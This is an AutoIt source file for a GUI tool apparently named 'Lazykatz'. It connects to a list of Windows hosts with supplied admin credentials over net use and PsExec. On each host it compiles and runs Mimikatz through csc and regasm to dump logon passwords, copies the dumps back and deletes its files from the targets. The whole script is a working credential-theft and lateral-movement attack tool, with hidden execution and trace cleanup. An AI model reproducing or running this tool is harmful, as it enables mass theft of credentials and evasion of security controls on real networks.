#Region ;**** Directives created by AutoIt3Wrapper_GUI ****
#AutoIt3Wrapper_Res_requestedExecutionLevel=requireAdministrator
#EndRegion ;**** Directives created by AutoIt3Wrapper_GUI ****

#include <File.au3>
#include <GUIConstants.au3>

Global $dir = @WorkingDir
FileDelete(@TempDir & "\psexec.exe")
FileInstall("PsExec.exe", @TempDir & "\psexec.exe")
FileInstall("katz.cs", @TempDir & "\katz.cs")
FileInstall("key.snk", @TempDir & "\key.snk")

$Form1 = GUICreate("Lazykatz", 622, 448, 192, 125)
GUICtrlCreateLabel("Username", 80, 40, 90, 25)
GUICtrlCreateLabel("Password", 80, 100, 90, 25)
GUICtrlCreateLabel("Choose IP list", 80, 155, 90, 25)
Global $USER1 = GUICtrlCreateInput("", 180, 40, 90, 25)
Global $PASS1 = GUICtrlCreateInput("", 180, 100, 90, 25,0x0020)
$Button1 = GUICtrlCreateButton("Browse", 180, 150, 81, 25)
$run = GUICtrlCreateButton("Start",80, 250, 120, 25)

GUISetState(@SW_SHOW)
While 1
    $msg = GuiGetMsg()
    Select
    Case $msg = $GUI_EVENT_CLOSE
        ExitLoop
    Case $msg = $Button1
		Global $list = FileOpenDialog("Select the IP list", @WorkingDir, "text (*.txt)", 1 + 4 )
		GUICtrlCreateLabel($list, 300, 155, 1000, 25)
        ;MsgBox(4096,"","You chose " & $list)
		Case $msg = $run
		Global $user = GUICtrlRead($USER1)
		Global $pass = GUICtrlRead($PASS1)
		attack()
    Case Else
    ;;;;;;;
    EndSelect
WEnd

Func attack()
FileChangeDir(@TempDir)

FileOpen($list, 0)
FileDelete("output.txt")

For $j = 1 to _FileCountLines($list)
    $ip = FileReadLine($list, $j)
	GUICtrlCreateLabel("", 80, 200, 200, 25)
	Sleep(1000)
	GUICtrlCreateLabel("Targetting - "&$ip, 80, 200, 200, 25)

global $status = 1

RunWait(@ComSpec & " /C " & "net use \\"&$ip&"\c$ /u:"&$user&" "&$pass&" > output.txt 2>&1","",@SW_HIDE,0x10000)

local $file = "output.txt"
FileOpen($file, 0)

For $i = 1 to _FileCountLines($file)
    $line = FileReadLine($file, $i)
	if StringInStr($line, "error") Then
		;MsgBox("","",$line)
		Sleep(1000)
		GUICtrlCreateLabel("Error connecting - "&$ip, 80, 200, 200, 25)
	global $status = 0
	EndIf
	Next
FileClose($file)

if not $status = 0 Then

RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\c$\windows\temp\katz.cs","",@SW_HIDE,0x10000)
RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\c$\windows\temp\key.snk","",@SW_HIDE,0x10000)
RunWait(@ComSpec & " /C " & "copy /Y katz.cs \\"&$ip&"\c$\windows\temp\","",@SW_HIDE,0x10000)
RunWait(@ComSpec & " /C " & "copy /Y key.snk \\"&$ip&"\c$\windows\temp\","",@SW_HIDE,0x10000)

RunWait(@ComSpec & " /C " & "psexec.exe /accepteula \\"&$ip&" -u "&$user&" -p "&$pass&' -s -h systeminfo | find /I "System Type:" > os.txt',"",@SW_HIDE,0x10000)

local $osfile = "os.txt"
FileOpen($osfile, 0)

For $i = 1 to _FileCountLines($osfile)
    $line = FileReadLine($osfile, $i)
	if StringInStr($line, "86") Then
	;MsgBox("","","x86")
	global $os = ""
	Else
	global $os = "64"
	EndIf
	Next
FileClose($osfile)

RunWait(@ComSpec & " /C " & "dir /L /A /B /S \\"&$ip&'\c$\windows\Microsoft.NET\Framework'&$os&'\ | find /I "regasm.exe" | find /I /V "regasm.exe.conf" | find /I /V "v1.1." > framework.txt',"",@SW_HIDE,0x10000)

local $fwfile = "framework.txt"
FileOpen($fwfile, 0)

For $i = 1 to _FileCountLines($fwfile)
    $line = FileReadLine($fwfile, $i)
	global $fw = StringSplit($line, '\', $STR_ENTIRESPLIT)[8]
	;MsgBox("","",$fw)
	ExitLoop
	Next
FileClose($fwfile)

if $fw Then
RunWait(@ComSpec & " /C " & "echo @echo off > lazy.bat","",@SW_HIDE,0x10000)
RunWait(@ComSpec & " /C " & "echo C:\Windows\Microsoft.NET\Framework"&$os&"\"&$fw&"\csc.exe /r:System.EnterpriseServices.dll /out:c:\windows\temp\mimi.exe /keyfile:c:\windows\temp\key.snk /unsafe c:\windows\temp\katz.cs >> lazy.bat","",@SW_HIDE,0x10000)
RunWait(@ComSpec & " /C " & "echo C:\Windows\Microsoft.NET\Framework"&$os&"\"&$fw&'\regasm.exe c:\windows\temp\mimi.exe "log c:\windows\temp\mimikatz.log" "privilege::debug" "sekurlsa::logonPasswords full" "exit" >> lazy.bat',"",@SW_HIDE,0x10000)
RunWait(@ComSpec & " /C " & "copy /Y lazy.bat \\"&$ip&"\c$\windows\temp\","",@SW_HIDE,0x10000)
RunWait(@ComSpec & " /C " & "psexec.exe /accepteula \\"&$ip&" -u "&$user&" -p "&$pass&' -s -h c:\windows\temp\lazy.bat',"",@SW_HIDE,0x10000)
RunWait(@ComSpec & " /C " & "copy /Y \\"&$ip&"\c$\windows\temp\mimikatz.log "&$dir&"\mimikatz_"&$ip&".log" ,"",@SW_HIDE,0x10000)
RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\c$\windows\temp\katz.cs","",@SW_HIDE,0x10000)
RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\c$\windows\temp\key.snk","",@SW_HIDE,0x10000)
RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\c$\windows\temp\mimikatz.log","",@SW_HIDE,0x10000)
RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\c$\windows\temp\mimi.exe","",@SW_HIDE,0x10000)
RunWait(@ComSpec & " /C " & "del /F \\"&$ip&"\c$\windows\temp\lazy.bat","",@SW_HIDE,0x10000)
EndIf
EndIf
Next
FileClose($list)
MsgBox("","","Attack finished.")
Exit
EndFunc
